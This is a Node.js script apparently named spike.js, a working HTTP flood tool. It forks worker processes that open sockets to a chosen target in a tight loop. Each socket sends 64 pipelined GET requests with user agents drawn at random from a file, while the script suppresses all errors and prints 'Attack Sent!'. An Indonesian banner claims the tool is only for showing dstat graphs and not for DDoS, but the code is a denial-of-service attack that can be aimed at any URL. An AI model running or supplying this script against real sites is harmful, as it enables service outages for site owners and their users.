const fs = require('fs');
const url = require('url');
const net = require('net');
const cluster = require('cluster');

if (process.argv.length <= 3) {
  console.log('node spike.js <url> <threads> <time>');
  process.exit(-1);
}

const target = process.argv[2];
const parsed = url.parse(target);
const host = parsed.host;
const threads = process.argv[3];
const time = process.argv[4];

require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

process.on('uncaughtException', function (error) {});
process.on('unhandledRejection', function (error) {});

let userAgents = [];
try {
  userAgents = fs.readFileSync('ua.txt', 'utf8').split('\n');
} catch (error) {
  console.error('\x1B[31mFile ua.txt tidak ada\n' + error);
  process.exit(-1);
}

const nullHexs = ['\0', 'ÿ', 'Â', '\xA0'];

if (cluster.isMaster) {
  for (let i = 0; i < threads; i++) {
    cluster.fork();
  }
  console.clear();
  console.log(
    '\n\n    NOTE!\n\n    TOOLS INI TIDAK DI GUNAKAN UNTUK DDOS! HANYA UNTUK SHOW DSTAT\n\n'
  );
  console.log('\x1B[33m(\x1B[33m!\x1B[37m) \x1B[33mAttack Sent!.');
  console.log('\x1B[31mDSTAT SPIKE Garuda Security');
  setTimeout(() => {
    process.exit(1);
  }, time * 1000);
} else {
  startFlood();
}

function startFlood() {
  const interval = setInterval(() => {
    const socket = require('net').Socket();
    socket.connect(80, host);
    socket.setTimeout(10000);

    for (let i = 0; i < 64; i++) {
      socket.write(
        'GET ' +
          target +
          ' HTTP/1.1\r\nHost: ' +
          parsed.host +
          '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' +
          userAgents[Math.floor(Math.random() * userAgents.length)] +
          '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n'
      );
    }

    socket.on('data', function () {
      setTimeout(function () {
        return socket.destroy(), delete socket;
      }, 5000);
    });
  });

  setTimeout(() => clearInterval(interval), time * 1000);
}